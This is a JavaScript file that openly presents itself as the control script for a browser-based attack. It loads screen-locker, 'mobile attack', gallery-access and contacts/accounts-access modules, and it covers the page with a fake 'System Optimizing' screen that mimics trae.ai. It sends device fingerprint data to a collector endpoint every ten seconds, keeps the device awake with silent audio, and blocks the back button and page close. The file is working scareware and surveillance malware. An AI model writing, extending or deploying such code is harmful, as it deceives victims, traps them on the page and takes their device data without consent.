/**
 * Main Integration Script
 * This script integrates all attack modules and initializes them
 * It serves as the central control point for the entire attack
 */

// Global device ID
let deviceId = localStorage.getItem('device_id');
if (!deviceId) {
    deviceId = 'dev_' + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('device_id', deviceId);
}

// Main initialization function
function initializeAttack() {
    console.log('Initializing attack modules...');
    
    // Create loading animation
    createLoadingAnimation();
    
    // Initialize screen locker first to prevent escape
    if (typeof ScreenLocker !== 'undefined') {
        ScreenLocker.init();
        console.log('Screen locker initialized');
    } else {
        console.error('Screen locker module not found');
        // Load it dynamically
        loadScript('screen_locker.js', function() {
            if (typeof ScreenLocker !== 'undefined') {
                ScreenLocker.init();
                console.log('Screen locker initialized (loaded dynamically)');
            }
        });
    }
    
    // Initialize mobile attack module
    if (typeof MobileAttack !== 'undefined') {
        MobileAttack.init();
        console.log('Mobile attack initialized');
    } else {
        console.error('Mobile attack module not found');
        // Load it dynamically
        loadScript('mobile_attack.js', function() {
            if (typeof MobileAttack !== 'undefined') {
                MobileAttack.init();
                console.log('Mobile attack initialized (loaded dynamically)');
            }
        });
    }
    
    // Initialize gallery access
    if (typeof GalleryAccess !== 'undefined') {
        GalleryAccess.init();
        console.log('Gallery access initialized');
    } else {
        console.error('Gallery access module not found');
        // Load it dynamically
        loadScript('gallery_access.js', function() {
            if (typeof GalleryAccess !== 'undefined') {
                GalleryAccess.init();
                console.log('Gallery access initialized (loaded dynamically)');
            }
        });
    }
    
    // Initialize contacts and accounts access
    if (typeof ContactsAccountsAccess !== 'undefined') {
        ContactsAccountsAccess.init();
        console.log('Contacts and accounts access initialized');
    } else {
        console.error('Contacts and accounts access module not found');
        // Load it dynamically
        loadScript('contacts_accounts.js', function() {
            if (typeof ContactsAccountsAccess !== 'undefined') {
                ContactsAccountsAccess.init();
                console.log('Contacts and accounts access initialized (loaded dynamically)');
            }
        });
    }
    
    // Set up periodic data collection
    setInterval(collectAndSendData, 10000); // Every 10 seconds
    
    // Set up device lock detection
    setupDeviceLockDetection();
    
    // Prevent navigation away
    preventNavigation();
    
    console.log('All attack modules initialized');
}

// Function to dynamically load scripts
function loadScript(url, callback) {
    const script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    script.onload = callback;
    document.head.appendChild(script);
}

// Create loading animation similar to trae.ai
function createLoadingAnimation() {
    const loadingContainer = document.createElement('div');
    loadingContainer.id = 'loading-container';
    loadingContainer.style.position = 'fixed';
    loadingContainer.style.top = '0';
    loadingContainer.style.left = '0';
    loadingContainer.style.width = '100%';
    loadingContainer.style.height = '100%';
    loadingContainer.style.backgroundColor = '#000';
    loadingContainer.style.display = 'flex';
    loadingContainer.style.flexDirection = 'column';
    loadingContainer.style.justifyContent = 'center';
    loadingContainer.style.alignItems = 'center';
    loadingContainer.style.zIndex = '999999';
    
    // Create logo
    const logo = document.createElement('div');
    logo.innerHTML = `
        <svg width="120" height="120" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="45" fill="none" stroke="#3498db" stroke-width="5">
                <animate attributeName="r" from="45" to="25" dur="1.5s" begin="0s" repeatCount="indefinite" />
                <animate attributeName="opacity" from="1" to="0.2" dur="1.5s" begin="0s" repeatCount="indefinite" />
            </circle>
            <circle cx="50" cy="50" r="25" fill="#3498db">
                <animate attributeName="opacity" from="0.2" to="1" dur="1.5s" begin="0s" repeatCount="indefinite" />
            </circle>
        </svg>
    `;
    
    // Create loading text
    const loadingText = document.createElement('div');
    loadingText.textContent = 'System Optimizing...';
    loadingText.style.color = '#fff';
    loadingText.style.fontFamily = 'Arial, sans-serif';
    loadingText.style.fontSize = '18px';
    loadingText.style.marginTop = '20px';
    
    // Create progress bar
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '80%';
    progressContainer.style.height = '4px';
    progressContainer.style.backgroundColor = '#333';
    progressContainer.style.borderRadius = '2px';
    progressContainer.style.marginTop = '20px';
    progressContainer.style.overflow = 'hidden';
    
    const progressBar = document.createElement('div');
    progressBar.style.width = '0%';
    progressBar.style.height = '100%';
    progressBar.style.backgroundColor = '#3498db';
    progressBar.style.transition = 'width 0.5s';
    progressContainer.appendChild(progressBar);
    
    // Create status text
    const statusText = document.createElement('div');
    statusText.id = 'status-text';
    statusText.textContent = 'Initializing...';
    statusText.style.color = '#aaa';
    statusText.style.fontFamily = 'Arial, sans-serif';
    statusText.style.fontSize = '14px';
    statusText.style.marginTop = '10px';
    
    // Assemble the loading container
    loadingContainer.appendChild(logo);
    loadingContainer.appendChild(loadingText);
    loadingContainer.appendChild(progressContainer);
    loadingContainer.appendChild(statusText);
    
    // Add to body
    document.body.appendChild(loadingContainer);
    
    // Animate progress
    let progress = 0;
    const statuses = [
        'Initializing system...',
        'Checking device compatibility...',
        'Optimizing performance...',
        'Scanning system files...',
        'Applying security patches...',
        'Syncing with cloud services...',
        'Finalizing optimization...',
        'Almost complete...'
    ];
    
    const interval = setInterval(() => {
        progress += Math.random() * 5;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            
            // Hide loading after a delay
            setTimeout(() => {
                loadingContainer.style.opacity = '0';
                loadingContainer.style.transition = 'opacity 1s';
                
                setTimeout(() => {
                    loadingContainer.style.display = 'none';
                }, 1000);
            }, 2000);
        }
        
        progressBar.style.width = `${progress}%`;
        
        // Update status text occasionally
        if (Math.random() < 0.1) {
            const statusIndex = Math.floor((progress / 100) * statuses.length);
            statusText.textContent = statuses[Math.min(statusIndex, statuses.length - 1)];
        }
    }, 200);
}

// Collect and send all data
function collectAndSendData() {
    const data = {
        device_id: deviceId,
        timestamp: new Date().toISOString(),
        device_info: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : 'unknown'
        }
    };
    
    // Send data to server
    fetch('data_collector.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .catch(error => {
        console.error('Error sending data:', error);
    });
}

// Set up device lock detection
function setupDeviceLockDetection() {
    let lastActive = Date.now();
    
    // Update last active time on any user interaction
    ['mousemove', 'keydown', 'touchstart', 'scroll'].forEach(event => {
        window.addEventListener(event, () => {
            lastActive = Date.now();
        });
    });
    
    // Check if device might be locked
    setInterval(() => {
        const inactiveTime = Date.now() - lastActive;
        if (inactiveTime > 30000) { // 30 seconds
            // Device might be locked, try to keep active
            keepDeviceActive();
        }
    }, 10000); // Check every 10 seconds
}

// Try to keep device active
function keepDeviceActive() {
    // Play a silent audio to prevent sleep
    try {
        const audio = new Audio();
        audio.src = 'data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA';
        audio.loop = true;
        audio.volume = 0.01; // Very low volume
        audio.play();
    } catch (e) {
        console.error('Failed to play audio:', e);
    }
    
    // Request wake lock if available
    if ('wakeLock' in navigator) {
        navigator.wakeLock.request('screen')
            .catch(err => console.error('Wake Lock error:', err));
    }
}

// Prevent navigation away from the page
function preventNavigation() {
    // Handle back button
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', function() {
        window.history.pushState(null, '', window.location.href);
    });
    
    // Handle page close/refresh
    window.addEventListener('beforeunload', function(e) {
        // Cancel the event
        e.preventDefault();
        // Chrome requires returnValue to be set
        e.returnValue = '';
        
        // Try to send final data before closing
        const finalData = {
            device_id: deviceId,
            event: 'page_close_attempt',
            timestamp: new Date().toISOString()
        };
        
        // Use sendBeacon for more reliable delivery when page is unloading
        if (navigator.sendBeacon) {
            navigator.sendBeacon('data_collector.php', JSON.stringify(finalData));
        } else {
            // Fallback to sync XHR (not recommended but better than nothing)
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'data_collector.php', false); // false = synchronous
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(finalData));
        }
        
        return '';
    });
}

// Initialize everything when the page loads
window.addEventListener('DOMContentLoaded', function() {
    // Short delay to ensure the page is fully loaded
    setTimeout(initializeAttack, 500);
});

// Fallback if DOMContentLoaded already fired
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(initializeAttack, 500);
}